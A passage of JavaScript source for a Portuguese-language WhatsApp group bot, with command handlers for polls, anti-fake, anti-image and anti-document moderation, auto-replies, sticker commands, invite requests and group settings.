
            let buttonMessageUpvote = {
                text: teks_vote,
                footer: `${watermark}`,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            anya.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
                
            if (!m.isGroup) return m.reply(mess.group)
            if (!(m.chat in vote)) return anya.sendMessage(m.chat, {text: `_*sem votação neste grupo!*_\n\n*${prefix}vote* - para começar a votar`})
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return anya.sendMessage(m.chat, {text: 'Você votou'})
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTO 」*

*RAZÃO:* ${vote[m.chat][0]}

┏❰UPVOTE ❱
┃ 
┃ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `┃ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
┃ 
┗━━━━

┏❰DEVOTE ❱
┃ 
┃ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `┃ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
┃ 
┗━━━━`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: 'VOTAR'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTAR'}, type: 1},
              {buttonId: `${prefix}deletevote`, buttonText: {displayText: 'DELETAR VOTAÇÃO'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: `${watermark}`,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            anya.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'cekvote':
if (!m.isGroup) return m.reply(mess.group)
if (!(m.chat in vote)) return m.reply(`_*sem votação neste grupo!*_\n\n*${prefix}vote* - para começar a votar`)
teks_vote = `*「 VOTE 」*

*RAZÃO:* ${vote[m.chat][0]}

┏❰UPVOTE ❱
┃ 
┃ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `┃ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
┃ 
┗━━━━

┏❰DEVOTE ❱
┃ 
┃ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `┃ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
┃ 
┗━━━━`
anya.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return m.reply(mess.group)
            if (!(m.chat in vote)) return anya.sendMessage(m.chat, {text: `_*sem votação neste grupo!*_\n\n*${prefix}vote* - para começar a votar`})
            delete vote[m.chat]
            anya.sendMessage(m.chat, {text:'*Excluir sessão de votação neste grupo com sucesso*'})
	    }
            break
   case 'antifake':
 //   
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    if (!m.isGroup) return m.reply(mess.group)
                    if (!isAdmins && !groupOwner) return m.reply(mess.admin)         
var alone3 = `${isAntiFa ? 'Ativado✅':'Desativado❌'}`        
                    if (args[0] === "on") {
                        if (isAntiFa) return m.reply('❎O recurso ANTIFAKE já está ativado no grupo❎')
                        antifake.push(from)
                        fs.writeFileSync('./database/antis/antifake.json', JSON.stringify(antifake))
                        m.reply(`*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Fake*\n*🎚️Opção: Ativada*\n*📊 Status: Sucesso*`)
                        var groupe = await anya.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
/*anya.sendMessage(m.chat, {text: `\`\`\`「 ⚠️ATENÇÃO⚠️ 」\`\`\`\n\nantifake está ativo, qualquer número fake será expulso imediatamente!`, contextInfo: { mentionedJid : mems }}, {quoted: m})*/
                    } else if (args[0] === "off") {
                        if (!isAntiFa) return m.reply('❎O recurso de antifake não está ativado no grupo❎')
                        let position = false
                        Object.keys(antifake).forEach((i) => {
                            if (antifake[i] === from) {
                                position = i
                            }
                        })
                        if (position !== false) {
                            antifake.splice(position, 1)
                            fs.writeFileSync('./database/antis/antifake.json', JSON.stringify(antifake))
                        }
                        m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Fake*\n*🎚️Opção: Desativada*\n*📊 Status: Sucesso*')
                    } else {
            if (alone3 == 'Ativado✅') {
let buttonsk = [
  { buttonId: `${prefix + command} off`, buttonText: { displayText: '❌ DESATIVAR' }, type: 1 }
  ]
  await anya.sendButtonText(m.chat, buttonsk, `*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-FAKE*\n*🎚️Opção: ATIVADO*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O anti-fake esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo*`, `${watermark}`, m)
}
if (alone3 == 'Desativado❌') {
let buttonsk = [
  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ ATIVAR' }, type: 1 }
  ]
  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-FAKE*\n*🎚️Opção: DESATIVADO*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O antifake esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo*', `${watermark}`, m)
}
  }
                    break
case 'dontback':
					if (!m.isGroup) return m.reply(resposta.group)
					if (!isAdmins) return m.reply(resposta.admin)
					if (args.length < 1) return m.reply('Hmmmm')
					if (Number(args[0]) === 1) {
						var ind = dbids.indexOf(from)
						if(isDontBack) {
							dontback[ind].actived = true
						} else {
							dontback.push({
								groupId: from,
								actived: true,
								number: []
							})
						}
						fs.writeFileSync('./database/dontback.json', JSON.stringify(dontback, null, 2) + '\n')
						m.reply(`Ativou com sucesso o recurso de don't back neste grupo✔️`)
					} else if (Number(args[0]) === 0) {
						var ind = dbids.indexOf(from)						
						if(isDontBack) {
							dontback[ind].actived = false
						} else {
							dontback.push({
								groupId: from,
								actived: false,
								number: []
							})
						}
						fs.writeFileSync('./database/dontback.json', JSON.stringify(dontback, null, 2) + '\n')
						m.reply(`Desativou com sucesso o recurso de don't back neste grupo✔️`)
					} else {
						m.reply('1 para ativar, 0 para desativar')
					}
				break
				case 'dbackadd':
					if (!m.isGroup) return m.reply(mess.group)
                    if (!isAdmins && !groupOwner) return m.reply(mess.admin)  
					if (args.length < 1) return m.reply('Diga o numero sem espaço, + ou traço')
					if (isNaN(args[0])) return m.reply('Diga o numero sem espaço, + ou traço')
					var ind = dbids.indexOf(from)
					if(isDontBack) {
						var numind = dontback[ind].number.indexOf(args[0])
						if(numind >= 0) return m.reply('*Esse Número ja esta incluso*')
						dontback[ind].number.push(args[0])
					} else {
						dontback.push({
							groupId: from,
							actived: false,
							number: [args[0]]
						})
					}
					fs.writeFileSync('./database/dontback.json', JSON.stringify(dontback, null, 2) + '\n')
					m.reply(`*Número adicionado a lista de don't back*`)

				break
				case 'dbackrm':
					if (!m.isGroup) return m.reply(mess.group)
                    if (!isAdmins && !groupOwner) return m.reply(mess.admin)  
					if (args.length < 1) return m.reply('Diga o numero sem espaço, + ou traço')
					if (isNaN(args[0])) return m.reply('Diga o numero sem espaço, + ou traço')
					var ind = dbids.indexOf(from)
					if(!isDontBack) return m.reply('*Nenhum Número não foi adicionado*')
					var numind = dontback[ind].number.indexOf(args[0])
					if(numind < 0) return m.reply('*Esse número não está incluso*')
					dontback[ind].number.splice(numind, 1)
					fs.writeFileSync('./database/dontback.json', JSON.stringify(dontback, null, 2) + '\n')
					m.reply(`*Número removido a lista de don't back*`)
				break
				case 'dbacklist':
					if (!m.isGroup) return m.reply(mess.group)
                    if (!isAdmins && !groupOwner) return m.reply(mess.admin)  
					var ind = dbids.indexOf(from)
					if(!isDontBack) return m.reply('*Nenhum Número não foi adicionado*')
					teks = '*Números que vou moer na porrada se voltar 😡:*\n'
					for(i=0;i<dontback[ind].number.length;++i) {
						teks += `➤ *${dontback[ind].number[i]}*\n`
					}
					teks += '*Esses ai vou descer meu martelo do ban 🥵*'
					m.reply(teks)
				break
   case 'antiimg':
 //   
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    if (!m.isGroup) return m.reply(mess.group)
                    if (!isAdmins && !groupOwner) return m.reply(mess.admin)         
var alone3 = `${isAntiImg ? 'Ativado✅':'Desativado❌'}`        
                    if (args[0] === "on") {
                        if (isAntiImg) return m.reply('❎O recurso de anti imagem já está ativado no grupo❎')
                        antiimg.push(from)
                        fs.writeFileSync('./database/antis/antiimg.json', JSON.stringify(antiimg))
                        m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Imagem*\n*🎚️Opção: Ativada*\n*📊 Status: Sucesso*')
                        var groupe = await anya.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
anya.sendMessage(m.chat, {text: `\`\`\`「 ⚠️ATENÇÃO⚠️ 」\`\`\`\n\nanti imagem esta ativo, qualquer membro q enviar alguma imagem será expulso imediatamente`, contextInfo: { mentionedJid : mems }}, {quoted: m})
                    } else if (args[0] === "off") {
                        if (!isAntiImg) return m.reply('❎O recurso de anti imagem não está ativado no grupo❎')
                        let position = false
                        Object.keys(antiimg).forEach((i) => {
                            if (antiimg[i] === from) {
                                position = i
                            }
                        })
                        if (position !== false) {
                            antiimg.splice(position, 1)
                            fs.writeFileSync('./database/antis/antiimg.json', JSON.stringify(antiimg))
                        }
                        m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Imagem*\n*🎚️Opção: Desativada*\n*📊 Status: Sucesso*')
                    } else {
            if (alone3 == 'Ativado✅') {
let buttonsk = [
  { buttonId: `${prefix + command} off`, buttonText: { displayText: '❌ DESATIVAR' }, type: 1 }
  ]
  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-IMAGEM*\n*🎚️Opção: ATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O anti imagem esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo', `${watermark}`, m)
}
if (alone3 == 'Desativado❌') {
let buttonsk = [
  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ ATIVAR' }, type: 1 }
  ]
  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-IMAGEM*\n*🎚️Opção: DESATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O anti imagem esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo', `${watermark}`, m)
}
  }
                    break
case 'anticatalogo':
case 'catálogo':
case 'catalogo':
if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
const alone2 = `${isAntiCatalogo ? 'Ativado✅':'Desativado❌'}`
if (args[0] === "on") {
if (isAntidoc) return m.reply('Já Esta ativo')
anticatalogo.push(from)
fs.writeFileSync('./database/antis/anticatalogo.json', JSON.stringify(anticatalogo))
m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Catalogo*\n*🎚️Opção: Ativada*\n*📊 Status: Sucesso*️')
var groupe = await anya.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
anya.sendMessage(m.chat, {text: `\`\`\`「 ⚠️ATENÇÃO⚠️ 」\`\`\`\n\nAnti catalogo esta ativo, qualquer membro q enviar trava catalogo será expulso imediatamente!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!isAntiCatalogo) return m.reply('Ja esta Desativado.')
anticatalogo.splice(from, 1)
fs.writeFileSync('./database/antis/anticatalogo.json', JSON.stringify(anticatalogo))
m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Catalogo*\n*🎚️Opção: Desativada*\n*📊 Status: Sucesso*️')
} else {
if (alone2 == 'Ativado✅') {
let buttonsk = [
  { buttonId: `${prefix + command} off`, buttonText: { displayText: '❌ DESATIVAR' }, type: 1 }
  ]
  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-CATALOGO*\n*🎚️Opção: ATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O anti catalogo esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo*', `${watermark}`, m)
}
if (alone2 == 'Desativado❌') {
let buttonsk = [
  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ ATIVAR' }, type: 1 }
  ]
  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-CATALOGO*\n*🎚️Opção: DESATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O anti catalogo esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo', `${watermark}`, m)
}
}
break
case 'antidoc':
//addFilter(from) 
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
const alone1 = `${isAntidoc ? 'Ativado✅':'Desativado❌'}`
if (args[0] === "on") {
if (isAntidoc) return m.reply('Já Esta ativo')
antidoc.push(from)
fs.writeFileSync('./database/antis/antidoc.json', JSON.stringify(antidoc))
m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Documento*\n*🎚️Opção: Ativada*\n*📊 Status: Sucesso*')
var groupe = await anya.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
anya.sendMessage(m.chat, {text: `\`\`\`「 ⚠️ATENÇÃO⚠️ 」\`\`\`\n\nAnti documento esta ativo, qualquer membro q enviar trava documento será expulso imediatamente!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!isAntidoc) return m.reply('Ja esta Desativado.')
antidoc.splice(from, 1)
fs.writeFileSync('./database/antis/antidoc.json', JSON.stringify(antidoc))
m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Documento*\n*🎚️Opção: Desativada*\n*📊 Status: Sucesso*')
} else {
            if (alone1 == 'Ativado✅') {
let buttonsk = [
  { buttonId: `${prefix + command} off`, buttonText: { displayText: '❌ DESATIVAR' }, type: 1 }
  ]
  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-DOCUMENTO*\n*🎚️Opção: ATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*o anti documento esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo', `${watermark}`, m)
}
if (alone1 == 'Desativado❌') {
let buttonsk = [
  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ ATIVAR' }, type: 1 }
  ]
  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-DOCUMENTO*\n*🎚️Opção: DESATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*o anti documento esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo', `${watermark}`, m)
}
}                   
break
case 'addrespon':
//			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return m.reply(`Use assim ${prefix + command} olá|olá ${pushname}`)
				argz = q.split('|')
				if (checkCommands(argz[0], commandsDB) === true) return m.reply(`Já tem essa resposta`)
				addCommands(argz[0], argz[1], sender, commandsDB)
				m.reply(`Sucesso ao adicionar a resposta: ${argz[0]}`)
				break
			case 'delrespon':
			if (!isCreator && !m.key.fromMe) return m.reply(mess.owner)
				if (args.length < 1) return m.reply(`Use assim ${prefix + command} oii`)
				if (!checkCommands(body.slice(11), commandsDB)) return m.reply(`Esta resposta não esta na lista`)
                deleteCommands(body.slice(11), commandsDB)
				m.reply(`Resposta deletada com sucesso:\n ${body.slice(11)}`)
				break
				case 'listrespon':
teks = `\`\`\`「 LISTA DE RESPOSTAS  」\`\`\`\n\n`
for (let i = 0; i < commandsDB.length; i ++){
teks += `❏ *Pergunta:* ${commandsDB[i].pesan}\n`
teks += `❏ *Resposta:* ${commandsDB[i].balasan}\n`
teks += `❏ *Criador:* ${commandsDB[i].creator}\n\n`
}
m.reply(teks)
break
case 'kontak':
				case 'criarctt':
				if (!m.isGroup) return m.reply(mess.group)
					argzu = q.split('|')
				if (!argzu) return m.reply(`Use assim: ${prefix + command} @tag|nome`)
				if (m.message.extendedTextMessage != undefined){
                    mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
					sendKontak(from, mentioned[0].split('@')[0], argzu[1])
				} else {
					sendKontak(from, argzu[0], argzu[1])
				}
				break
  case 'caripesan':
  case 'pesquisamsg':
if (args.length < 1) return reply(`Use assim ${prefix + command} olá|15`)
tekse = args.join('')
if (tekse.includes("|")) { 
try {
var ve = tekse.split("|")[0]
var za = tekse.split("|")[1]
if (za > 15) return m.reply('máximo 15')
sampai = `${za}`
batas = parseInt(sampai) + 1
cok = await anya.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Mensagem não encontrada!') 
if (cok.messages.length < parseInt(batas)) rm.eply(`Encontrado apenas ${cok.messages.length - 1} Msgs`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
anya.sendMessage(m.chat, {text: 'Aqui está a mensagem!'}, {quoted:m})
}
}
} catch(e) {
console.log(e)
return m.reply(mess.erro)
}
} else {
m.reply(`Use assim ${prefix + command} Olá|15`)
}
break
case 'antiviewonce':
 //   
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    if (!m.isGroup) return m.reply(mess.group)
                    if (!isAdmins && !groupOwner) return m.reply(mess.admin)         
var alone3 = `${isAntiVO ? 'Ativado✅':'Desativado❌'}`        
                    if (args[0] === "on") {
                        if (isAntiVO) return m.reply('❎O recurso de anti visualização unica já está ativado no grupo❎')
                        antiviewonce.push(from)
                        fs.writeFileSync('./database/antis/antiviewonce.json', JSON.stringify(antiviewonce))
                        m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Visualização Única*\n*🎚️Opção: Ativada*\n*📊 Status: Sucesso*')
                        var groupe = await anya.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
                    } else if (args[0] === "off") {
                        if (!isAntiVO) return m.reply('❎O recurso de anti visualização unica não está ativado no grupo❎')
                        let position = false
                        Object.keys(antiviewonce).forEach((i) => {
                            if (antiviewonce[i] === from) {
                                position = i
                            }
                        })
                        if (position !== false) {
                            antiviewonce.splice(position, 1)
                            fs.writeFileSync('./database/antis/antiviewonce.json', JSON.stringify(antiviewonce))
                        }
                        m.reply('── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: Anti-Visualização Única*\n*🎚️Opção: Desativada*\n*📊 Status: Sucesso*')
                    } else {
            if (alone3 == 'Ativado✅') {
let buttonsk = [
  { buttonId: `${prefix + command} off`, buttonText: { displayText: '❌ DESATIVAR' }, type: 1 }
  ]
  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-VIEWONCE*\n*🎚️Opção: ATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O anti visualização unica esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo', `${watermark}`, m)
}
if (alone3 == 'Desativado❌') {
let buttonsk = [
  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ ATIVAR' }, type: 1 }
  ]
  await anya.sendButtonText(m.chat, buttonsk, '*── 「 OPÇÃO 」 ──*\n\n*🗂 ️Tipo: ANTI-VIEWONCE*\n*🎚️Opção: DESATIVADA*\n\n*── 「 INFORMAÇÃO 」 ──*\n\n*O anti visualização unica esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo', `${watermark}`, m)
}
  }
                    break
case 'mute': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
                if (args[0] === "on") {
                if (db.chats[m.chat].mute) return m.reply(`*Já está ok*`)
                db.chats[m.chat].mute = true
                m.reply(`${nomedobot} *foi silenciado neste grupo!*`)
                } else if (args[0] === "off") {
                if (!db.chats[m.chat].mute) return m.reply(`*Já está desligado ok*`)
                db.chats[m.chat].mute = false
                m.reply(`${nomedobot} *não esta mais silenciada neste grupo!*`)
                } else {
                 let buttons = [
                        { buttonId: '!mute on', buttonText: { displayText: 'ON' }, type: 1 },
                        { buttonId: '!mute off', buttonText: { displayText: 'OFF' }, type: 1 }
                    ]
                    await anya.sendButtonText(m.chat, buttons, `Silenciar bot`, `${watermark}`, m)
                }
             }
             break
case 'resetlink': {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !groupOwner && !isCreator) return m.reply(mess.admin)
anya.groupRevokeInvite(m.chat)
let buttons = [
                        { buttonId: `${prefix}linkgp`, buttonText: { displayText: 'Novo link' }, type: 1 },                       
                    ]
                    await anya.sendButtonText(m.chat, buttons, ' link do grupo resetado com sucesso, clique no botão abaixo para conferir o novo link', `${watermark}`, m)
}
break
case `wame`:
                    
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                    options = {
                        text: `Seu link wa.me: wa.me/${m.sender.split("@s.whatsapp.net")[0]}\nOu: \napi.whatsapp.com/send?phone=${m.sender.split("@")[0]}`,
                        contextInfo: {
                            mentionedJid: [m.sender]
                        }
                    }
                    anya.sendMessage(from, options, text, {
                        quoted: m
                    })
                    break
case 'anagrama':
 
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
const anaaleatorio = Math.floor(Math.random() * palavrasANA.length)
if(!isAdmins && !groupOwner) return m.reply('comando apenas para admins')
if(args.length == 0) return m.reply('use 1 para ativar o jogo do anagrama\npara desativar use anagrama 0')
if (args.join(' ') === '1') {
if(fs.existsSync(`./src/anagrama-${from}.json`)) {
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./src/anagrama-${from}.json`))
m.reply(`o jogo já foi iniciado neste grupo:
palavra: ${dataAnagrama2.embaralhada}
dica: ${dataAnagrama2.dica}
`)} else {
fs.writeFileSync(`./src/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[anaaleatorio])}`)
m.reply(`
╭─────≽「 👾 ANAGRAMA 👾 」
│➽ DESCUBRA A PALAVRA
│➽ ANAGRAMA: ${palavrasANA[anaaleatorio].embaralhada}
│➽ DICA: ${palavrasANA[anaaleatorio].dica}
╰────────────────────────`)
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./src/anagrama-${from}.json`)) return m.reply('não tem como desativar o jogo do anagrama pôs ele não foi ativado')
fs.unlinkSync(`./src/anagrama-${from}.json`)
m.reply("desativado com sucesso")
}
break 
case 'autostickerpv':
            case 'autostikerpc':
if (!m.isGroup) return m.reply(mess.group)
//if (args.length < 1) return m.reply('digite um adesivo para ativar\n digite o adesivo automático para desativar')
if (args[0]  === 'on'){
if (isAutoStick) return m.reply(`Já ativado`)
_autostick.push(from)
fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autostick))
m.reply('autosticker pc ativado')
} else if (args[0] === 'off'){
let anu = autostick.indexOf(from)
_autostick.splice(anu, 1)
fs.writeFileSync('./database/autostickpc.json', JSON.stringify(autostick))
m.reply('autosticker pc desativado')
}
break
case 'setcmd': {
                if (!m.quoted) return m.reply(`Reply Message!`)
                if (!m.quoted.fileSha256) return m.reply(`SHA256 Hash Missing`)
                if (!text) return m.reply(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return m.reply(`Você não tem permissão para alterar este comando de adesivo`)
                global.db.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return m.reply(`No Hashes`)
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return m.reply(`Você não tem permissão para excluir este comando de adesivo`)
                delete global.db.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*Lista de hash*
Informações: *negrito* hash está bloqueado
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                anya.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) return replay('somente meu dono')
                if (!m.quoted) return m.reply(`Reply Message!`)
                if (!m.quoted.fileSha256) return m.reply(`SHA256 Hash Missing`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.sticker)) return m.reply(`Hash Not Found In Database`)
                global.db.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
          
	    break
case `convite`:
case `joinlink`:
case `accept`:
case `aceitar`:
if (args.length == 0) return m.reply(`Digite o link do grupo
Exemplo: (${prefix}joinlink/accept/convite/aceitar) https://chat.whatsapp.com/JOdlhLSDQEHC9dRBbmT5xf`)
if (args.length > 300) return anya.sendMessage(from, { text: `Máximo 300 caracteres`}, {quoted: m})   
var nomor = m.participant
let buttons = [
                        { buttonId: `${prefix}entrarlink ${body.slice(8)}`, buttonText: { displayText: `𝐀𝐂𝐄𝐈𝐓𝐀𝐑 𝐂𝐎𝐍𝐕𝐈𝐓𝐄` }, type: 1 },
                        { buttonId: `${prefix}negarconvite ${m.sender.split("@s.whatsapp.net")[0]}`, buttonText: { displayText: `𝐍𝐄𝐆𝐀𝐑 𝐂𝐎𝐍𝐕𝐈𝐓𝐄` }, type: 1 }
                    ]
                    await anya.sendButtonText(`558898204406@s.whatsapp.net`, buttons, `[CONVITE]\nDe: wa.me/${m.sender.split("@s.whatsapp.net")[0]}\nLink: ${body.slice(8)}`, watermark, m)
 m.reply('a solicitação para o bot entrar no seu grupo foi enviada para o meu criador, agr cabe a ele decidir se eu entro no seu grupo ou não!')                   
break

case `entrarlink`:
case `entrar`:
if (!isCreator) return m.reply(mess.dono)
if(!isUrl(args[0]) && !args[0].includes(`whatsapp.com`)) return m.reply(`Cade o Link de Convite Mano?`)
let result = args[0].split(`https://chat.whatsapp.com/`)[1]
await anya.groupAcceptInvite(result)
m.reply(`*[💦] Certo Mestre, Ja Entrei No Grupo*`)
break

case `negarconvite`:
if (!isCreator) return m.reply(mess.dono)
teks1 = `*[💦]Ola Humano...* \n*Meu Mestre Não Aceitou Seu Convite*`
try{
var options = {
text: teks1, 
contextInfo: {mentionedJid: [m.sender]}, 
}

anya.sendMessage(`${q}@s.whatsapp.net`, options, text, {quoted: m})
} catch {
m.reply(`Erro ao Enviar a Msg`)
}
break
case `group`: case `grup`: case `gp`: case `grupo`: {            	    
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins && !groupOwner) return m.reply(mess.admin)
                if (q === `abrir`){
              await anya.groupSettingUpdate(m.chat, `not_announcement`).then((res) => m.reply(`grupo aberto com sucesso`)).catch((err) => m.reply(jsonformat(err)))
              } else if (q === `fechar`){
              await anya.groupSettingUpdate(m.chat, `announcement`).then((res) => m.reply(`grupo fechado com sucesso`)).catch((err) => m.reply(jsonformat(err)))
             } else if (!q) {
            enviarbutao(m.chat, `🔒 *_COFIGURAÇÃO DO GRUPO_* 🔓`, `Selecione abaixo`,  [{ quickReplyButton: { displayText: `🔓ABRIR`, id: `${prefix}gp abrir` } }, { quickReplyButton: { displayText: `🔒FECHAR`, id: `${prefix}gp fechar` } }])           
            }
            }
            break            
case `editinfo`: {
	
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins && !groupOwner) return m.reply(mess.admin)
             if (args[0] === `open`){
                await anya.groupSettingUpdate(m.chat, `unlocked`).then((res) => m.reply(`Agora todos podem alterar as informações do grupo.`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === `close`){
                await anya.groupSettingUpdate(m.chat, `locked`).then((res) => m.reply(`Agora apenas adms podem alterar as informações do grupo.`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: `${prefix}editinfo open`, buttonText: { displayText: `abrir` }, type: 1 },
                        { buttonId: `${prefix}editinfo close`, buttonText: { displayText: `fechar` }, type: 1 }
                    ]
                    await anya.sendButtonText(m.chat, buttons, `escolha uma das opções.`, watermark, m)

            }
            }
            break
case "blockspam": //russo and chefin
//if (!isCreator && !isPremium) return anya.sendMessage(from, {text: `somente premiuns podem usar este comando.`})
if(args[0].startsWith('@558898204406@s.whatsapp.net')) return m.reply('pq está tentando dar block spam no meu criador inceto?')
